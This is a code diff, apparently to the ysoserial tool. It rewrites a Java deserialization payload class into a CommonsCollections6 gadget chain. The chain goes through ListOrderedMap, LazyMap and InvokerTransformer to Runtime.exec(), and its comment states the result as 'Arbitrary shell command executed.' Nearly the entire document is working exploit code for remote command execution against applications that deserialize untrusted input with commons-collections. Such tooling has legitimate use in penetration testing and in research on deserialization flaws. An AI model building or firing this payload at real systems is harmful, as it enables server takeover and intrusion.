@@ -1,31 +1,33 @@
 package ysoserial.payloads;
 
 import java.lang.reflect.InvocationHandler;
+import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.Map;
+
+import javax.management.MXBean;
 
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.map.ListOrderedMap;
 
-import groovy.lang.Grab;
 import ysoserial.annotation.Bind;
 import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.annotation.Dependencies;
-import ysoserial.payloads.annotation.PayloadTest;
-import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
-import ysoserial.payloads.util.Version;
 
 /*
-	Gadget chain:	
-		ObjectInputStream.readObject()
-			AnnotationInvocationHandler.readObject()
-				Map(Proxy).entrySet()
-					AnnotationInvocationHandler.invoke()
+Gadget chain:	
+	ObjectInputStream.readObject()
+		AnnotationInvocationHandler.readObject()
+			Map(Proxy).entrySet()
+				ListOrderedMap.EntrySetView.iterator()
+					ListOrderedMap.ListOrderedIterator.next()
+					ListOrderedMap.ListOrderedMapEntry.value()
 						LazyMap.get()
 							ChainedTransformer.transform()
 								ConstantTransformer.transform()
@@ -34,40 +36,24 @@ import ysoserial.payloads.util.Version;
 										Class.getMethod()
 								InvokerTransformer.transform()
 									Method.invoke()
-										Runtime.getRuntime()
-								InvokerTransformer.transform()
-									Method.invoke()
-										Runtime.exec()										
-	
-	Requires:
-		commons-collections
+										Runtime.exec()							
+
+Requires:
+	commons-collections
+
+Result:
+	Arbitrary shell command executed
+
  */
 @SuppressWarnings({"rawtypes", "unchecked"})
-@Grab( "commons-collections:commons-collections:3.1" )
 @Dependencies({"commons-collections:commons-collections:3.1"})
-@PayloadTest( precondition = "testCheckJavaVersion" )
-public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
-	
-	@Bind( helpText = "The command to execute" )
-	private String command;
+public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
 
-	@Bind( defaultValue = "false", helpText = "if true, the command will be executed in a shell (e.g. bash -c [command])" ) 
-	private boolean useShell;
+	@Bind private String command;
+	@Bind( defaultValue = "false" ) private boolean useShell;
+	@Bind( defaultValue = "/bin/bash" ) private String shell;
+	@Bind( defaultValue = "-c" ) private String shellParam;
 	
-	@Bind( defaultValue = "/bin/bash", helpText = "shell to use (default /bin/bash)" ) 
-	private String shell;
-	
-	@Bind( defaultValue = "-c", helpText = "shell 'execute' parameter (default -c)" ) 
-	private String shellParam;
-
-	
-	/**
-	 * @deprecated Use {@link #getObject()} instead
-	 */
-	public InvocationHandler getObject(final String command) throws Exception {
-		return getObject();
-	}
-
 	public InvocationHandler getObject() throws Exception {
 		String[][] execArgs = new String[][] { { command } };
 		
@@ -93,24 +79,32 @@ public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<
 							new Class[] { String.class }, execArgs[0] ),
 				new ConstantTransformer(1) };
 
-		final Map innerMap = new HashMap();
-
+		final Map innerMap = new HashMap();		
+		innerMap.put( "3", "x" );
+		innerMap.put( "4", "y" );
 		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-		
-		final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
-		
-		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
-		
+		final Map lomMap = ListOrderedMap.decorate( lazyMap );
+
+		ArrayList lomInsert = new ArrayList();
+		lomInsert.add( "value" );
+		Reflections.setFieldValue( lomMap, "insertOrder", lomInsert);
+
+		final InvocationHandler handler = createMemoizedInvocationHandler(lomMap);
+
 		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain	
-				
+
 		return handler;
 	}
-	
-	public static Boolean testCheckJavaVersion() { 
-		return Version.allowsDefaultAIH();
+
+	public InvocationHandler getObject(String command) throws Exception {
+		throw new UnsupportedOperationException( "Use the no-args bind version" );
 	}
-	
+
+	public static InvocationHandler createMemoizedInvocationHandler(Map<String, Object> map) throws Exception {
+		return (InvocationHandler)Reflections.getFirstCtor("sun.reflect.annotation.AnnotationInvocationHandler").newInstance(new Object[] { MXBean.class, map });
+	}
+
 	public static void main(final String[] args) throws Exception {
-		PayloadRunner.run(CommonsCollections1.class, args);
+		PayloadRunner.run(CommonsCollections6.class, args );
 	}
 }
